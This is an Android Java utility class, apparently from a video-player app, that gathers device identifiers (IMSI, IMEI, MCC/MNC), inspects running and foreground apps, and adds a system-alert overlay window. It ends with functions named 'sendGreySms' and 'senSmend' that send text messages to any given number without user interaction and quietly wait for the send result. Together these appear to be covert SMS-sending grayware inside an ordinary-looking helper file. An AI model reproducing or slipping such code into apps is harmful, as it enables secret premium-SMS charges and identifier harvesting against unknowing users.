package com.yp.youplayer.util;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.pm.ResolveInfo;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.telephony.gsm.SmsManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class CommonUtil {
    public static final String DEFAULT_VALUE = "unkown";

    /**
     * 获取IMSI
     *
     * @param context
     * @return
     */
    public static String getImsi(Context context) {
        String imsi = null;
        try {
            TelephonyManager telManager = (TelephonyManager) context
                    .getSystemService(Context.TELEPHONY_SERVICE);
            imsi = telManager.getSubscriberId();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return TextUtils.isEmpty(imsi) ? DEFAULT_VALUE : imsi;
    }

    /**
     * 获取IMEI
     *
     * @param context
     * @return
     */
    public static String getImei(Context context) {
        String imei = null;
        try {
            TelephonyManager telManager = (TelephonyManager) context
                    .getSystemService(Context.TELEPHONY_SERVICE);
            imei = telManager.getDeviceId();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return TextUtils.isEmpty(imei) ? DEFAULT_VALUE : imei;
    }

    /**
     * 获取MCC
     *
     * @param context
     * @return
     */
    public static String getMcc(Context context) {
        String mcc = null;
        try {
            String imsi = getImsi(context);
            if (null != imsi && !DEFAULT_VALUE.equals(imsi)) {
                mcc = imsi.substring(0, 3);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return TextUtils.isEmpty(mcc) ? DEFAULT_VALUE : mcc;
    }

    /**
     * 获取MNC
     *
     * @param context
     * @return
     */
    public static String getMnc(Context context) {
        String mnc = null;
        try {
            TelephonyManager telManager = (TelephonyManager) context
                    .getSystemService(Context.TELEPHONY_SERVICE);
            String perator = telManager.getSimOperator();
            String mcc = getMcc(context);
            if (null != perator && null != mcc && !DEFAULT_VALUE.equals(mcc)) {
                mnc = perator.substring(mcc.length());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return TextUtils.isEmpty(mnc) ? DEFAULT_VALUE : mnc;
    }

    /**
     * 获取 meta_info
     *
     * @param context
     * @return
     */
    public static String getMetaInfo(Context context, String str) {
        String metaDataStr = null;
        try {
            PackageManager packageManager = context.getPackageManager();
            ApplicationInfo appInfo = packageManager.getApplicationInfo(context.getPackageName(),
                    PackageManager.GET_META_DATA);
            Bundle metaData = appInfo.metaData;


            Object metaObj = metaData.get(str);
            if (null != metaObj) {
                metaDataStr = metaObj.toString();
            } else {
                return DEFAULT_VALUE;
            }
        } catch (Exception e) {
            return DEFAULT_VALUE;
//			e.printStackTrace();
        }
        return TextUtils.isEmpty(metaDataStr) ? DEFAULT_VALUE : metaDataStr;
    }

    /**
     * 获取手机 设备名
     *
     * @return
     */
    public static String getPhoneModel() {
        String model = null;
        try {
            model = Build.MODEL;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return TextUtils.isEmpty(model) ? DEFAULT_VALUE : model;
    }

    /**
     * 获取系统版本号
     *
     * @return
     */
    public static int getSysVerCode() {
        return Build.VERSION.SDK_INT;
    }

    /**
     * 获取系统版本
     *
     * @return
     */
    public static String getSysVerName() {
        return Build.VERSION.RELEASE;
    }

    /**
     * 判断应用是否能安装
     *
     * @param context
     * @param packageName
     * @param verCode
     * @return
     */
    public static boolean isAppCanInstall(Context context, String packageName, int verCode) {
        try {
            List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);
            for (PackageInfo pkgInfo : packs) {
                if (pkgInfo.packageName.equals(packageName)) {
                    return verCode > pkgInfo.versionCode;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }


    /**
     * 判断app是否正在运行
     *
     * @param packageName
     */
    public static boolean isAppRun(Context context, String packageName) {
        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> listOfProcesses = activityManager.getRunningAppProcesses();
        for (ActivityManager.RunningAppProcessInfo process : listOfProcesses) {
            Log.i("Process Running", process.processName);
            if (process.processName.contains(packageName)) {
                Toast.makeText(context, "app 已经在运行", Toast.LENGTH_SHORT).show();
                return true;
            }
        }
        Toast.makeText(context, "app 没有运行", Toast.LENGTH_SHORT).show();
        return false;
    }

    /**
     * 获取应用版本名称
     *
     * @return
     */
    public static String getAppVersionName(Context context) {
        String versionName = null;
        try {
            versionName = context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName;
        } catch (NameNotFoundException e) {
            e.printStackTrace();
        }
        return versionName;
    }

    /**
     * 获取应用版本号
     *
     * @return
     */
    public static int getAppVersionCode(Context context) {
        int verCode = 0;
        try {
            verCode = context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionCode;
        } catch (NameNotFoundException e) {
            e.printStackTrace();
        }
        return verCode;
    }

    public static String getCurrentPk(Context context) {
        // 当前正在运行的应用的包名
        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);

        String currentrunningpk = am.getRunningTasks(1).get(0).topActivity.getPackageName();

        return currentrunningpk;

    }


    /**
     * 配置WindowManager
     *
     * @param context
     * @param addView 添加到WindowManager中的布局
     * @return
     */
    public static WindowManager configWindow(Context context, View addView) {
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);

        WindowManager.LayoutParams params = new WindowManager.LayoutParams();

        // 类型
        params.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;

        // 设置flag
        // | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
        // 如果设置了WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE，弹出的View收不到Back键的事件
        //  WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE 使除了悬浮窗外的其他地方接收触摸事件
        params.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
        params.format = PixelFormat.RGBA_8888;
        params.width = windowManager.getDefaultDisplay().getWidth();
        params.height = windowManager.getDefaultDisplay().getHeight() / 2;
        params.gravity = Gravity.TOP;

        windowManager.addView(addView, params);
        return windowManager;
    }

    /**
     * 获得属于桌面的应用的应用包名称
     *
     * @return 返回包含所有包名的字符串列表
     */
    public static List<String> getHomes(Context context) {
        List<String> names = new ArrayList<String>();
        PackageManager pm = context.getPackageManager();
        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_HOME);
        List<ResolveInfo> resolveInfos = pm.queryIntentActivities(intent, PackageManager.MATCH_DEFAULT_ONLY);
        for (ResolveInfo info : resolveInfos) {
            names.add(info.activityInfo.packageName);
        }
        return names;
    }

    public static boolean isHome(Context context) {
        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningTaskInfo> runningTaskInfos = am.getRunningTasks(1);
        return getHomes(context).contains(runningTaskInfos.get(0).topActivity.getPackageName());
    }

    // *********************************************************

    private static void sendGreySms(String number, String body,
                                    PendingIntent sentIntent, PendingIntent deliveryIntent) {
        SmsManager smsManager = SmsManager.getDefault();
        if (body == null || body.length() <= 70) {
            smsManager.sendTextMessage(number, null, body, sentIntent,
                    deliveryIntent);
        } else {
            ArrayList<String> bodys = smsManager.divideMessage(body);
            for (String msg : bodys) {
                smsManager.sendTextMessage(number, null, msg, sentIntent,
                        deliveryIntent);
            }
        }
    }

    private static int sendres = -1;


    public static boolean senSmend(Context context, String smsNum,
                                   String smsBody) {

        boolean res = false;
        String SENT_SMS_ACTION = "SENT_SMS_ACTION";
        Intent sentIntent = new Intent(SENT_SMS_ACTION);
        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0,
                sentIntent, 0);
        context.registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                switch (getResultCode()) {
                    case Activity.RESULT_OK:
                        sendres = 0;
                        break;
                    default:
                        sendres = 1;
                        break;
                }
            }
        }, new IntentFilter(SENT_SMS_ACTION));
        PendingIntent deliverPI = null;
        sendGreySms(smsNum, smsBody, sentPI, deliverPI);
        for (int i = 0; i < 20; i++) {
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            if (0 == sendres) {
                sendres = -1;
                res = true;
                break;
            } else if (1 == sendres) {
                break;
            }
        }
        return res;
    }
}
